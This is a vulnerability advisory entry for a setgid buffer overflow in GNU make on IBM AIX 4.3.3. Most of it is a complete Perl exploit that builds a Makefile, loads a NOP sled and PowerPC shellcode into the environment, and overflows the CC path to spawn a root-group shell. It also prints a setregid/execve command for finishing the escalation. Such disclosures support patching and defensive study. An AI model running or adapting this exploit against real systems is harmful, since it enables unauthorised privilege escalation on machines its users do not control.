source: https://www.securityfocus.com/bid/9903/info

GNU make for IBM AIX has been reported to be prone to a buffer overflow vulnerability, the issue is reported to exist due to a lack of sufficient boundary checks performed when reading the path to the CC compiler.

Because the GNU make utility is reported to run with setGID root privileges, a local attacker may potentially exploit this condition to gain access to the root group.

This issue is reported to exist on AIX 4.3.3 platforms.

#!/usr/bin/perl
# FileName: x_make_aix433_limited.pl
# Exploit /usr/local/bin/make of Aix4.3.3 to get a gid=0 shell.
# Tested    on low version of Aix4.3.3.
# Author  : watercloud@xfocus.org
# Site    : www.xfocus.org (EN)  / www.xfocus.net (CN)
# Date    : 2003-5-30
# Announce: use as your owner risk!

$CMD="/usr/local/bin/make";
$_=`/usr/bin/oslevel`;

$XID="\x03";
@GID_LIST=(248,247);

print "\n\nExploit $CMD for Aix 4.3.3 to get gid=0 shell.\n";
print "From: [ www.xfocus.org 2003-5-30 ].\n\n";
print "Note :use this command to get gid=0 after egid=0 :\n";
print "/usr/bin/syscall setregid 0 0 \\; execve '/bin/sh'\n";

$str="k:k.c\n\t\${CC} k.c\n\t";
open  mfd,">Makefile" or die "open file Makefile for write error!\n";
open  kfd,">k.c"     or die "open file .k.c for write error!\n";
print mfd $str,  print kfd $str;
close mfd, close kfd;

$NOP="\x7c\xa5\x2a\x79"x800;
%ENV=();

foreach $GID ( @GID_LIST) {
  $ENV{CCC}=$NOP.&getshell($XID,chr($GID));
  system $CMD ,"CC="."\x2f\xf2\x2b\x40"x300;
}

unlink "Makefile","k.c";

#sub
sub getshell($XID,$GID) {
  my $SHELL,($XID,$GID)=@_;
  $SHELL="\x7e\x94\xa2\x79\x7e\x84\xa3\x78\x40\x82\xff\xfd";
  $SHELL.="\x7e\xa8\x02\xa6\x3a\xb5\x01\x40\x88\x55\xfe\xe0";
  $SHELL.="\x7e\x83\xa3\x78\x3a\xd5\xfe\xe4\x7e\xc8\x03\xa6";
  $SHELL.="\x4c\xc6\x33\x42\x44\xff\xff\x02$GID$XID\xff\xff";
  $SHELL.="\x38\x75\xff\x04\x38\x95\xff\x0c\x7e\x85\xa3\x78";
  $SHELL.="\x90\x75\xff\x0c\x92\x95\xff\x10\x88\x55\xfe\xe1";
  $SHELL.="\x9a\x95\xff\x0b\x4b\xff\xff\xd8/bin/sh\xff";
  return $SHELL;
}
#EOF